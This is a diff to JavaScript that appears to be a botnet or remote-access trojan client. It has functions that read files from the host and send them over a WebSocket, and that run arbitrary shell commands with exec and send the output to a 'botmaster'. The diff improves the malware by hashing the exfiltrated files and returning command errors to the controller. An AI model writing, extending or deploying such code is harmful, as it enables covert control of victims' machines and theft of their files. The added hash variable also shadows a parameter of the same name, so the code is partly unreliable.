@@ -1,5 +1,6 @@
 const fs = require('fs');
 const { exec } = require('child_process');
+const crypto = require('crypto');
 const {get} = require("http");
 function send_file_to_sv(id, name, filepath, webSocket, hash){
     // Open file
@@ -7,11 +8,19 @@ function send_file_to_sv(id, name, filepath, webSocket, hash){
     try {
         const data = fs.readFileSync(filepath, 'utf-8');
         // TODO optional hash for integrity check
+        // Create a hash object
+        const hash = crypto.createHash('sha256');
+
+        // Update the hash with the file data
+        hash.update(data);
+
+        // Generate the hash digest in hexadecimal format
+        const hashHex = hash.digest('hex');
         const result = {
             id,
             type: "Download",
             name: name,
-            hash: 0,
+            hash: hashHex,
             data: data
         };
         webSocket.send(JSON.stringify(result));
@@ -75,11 +84,25 @@ function start_shell(id, sh_cmd, botmaster, ws){
     exec(sh_cmd, (error, stdout, stderr) => {
         if (error) {
             console.error(`Error: ${error.message}`);
+            const result = {
+                id,
+                type: "Shell",
+                botmaster,
+                result: error.message
+            };
+            ws.send(JSON.stringify(result));
             return;
         }
 
         if (stderr) {
             console.error(`Standard Error: ${stderr}`);
+            const result = {
+                id,
+                type: "Shell",
+                botmaster,
+                result: stderr
+            };
+            ws.send(JSON.stringify(result));
             return;
         }
         console.log(`Standard Output: ${stdout}`);
